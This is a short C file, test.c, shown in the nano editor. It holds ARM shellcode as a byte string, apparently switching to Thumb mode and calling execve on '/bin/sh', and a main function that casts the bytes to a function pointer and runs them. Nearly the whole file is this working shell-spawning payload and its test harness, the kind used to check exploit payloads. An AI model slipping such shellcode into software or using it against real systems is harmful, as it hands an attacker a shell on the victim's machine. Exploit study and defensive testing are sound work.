GNU nano 7.2                    test.c
#include<stdio.h>
#include<string.h>

char code[] = "\x01\x30\x8f\xe2"                                                    "\x13\xff\x2f\xe1"
              "\x02\xa0"
              "\x49\x40"
              "\x52\x40"
              "\xc2\x71"
              "\x0b\x27"
              "\x01\xdf"
              "\x2f\x62\x69\x6e"
              "\x2f\x73\x68\x58";
    int main()
    {
        void (*shell)();
        shell=(void (*)())code;
        (*shell)();
}
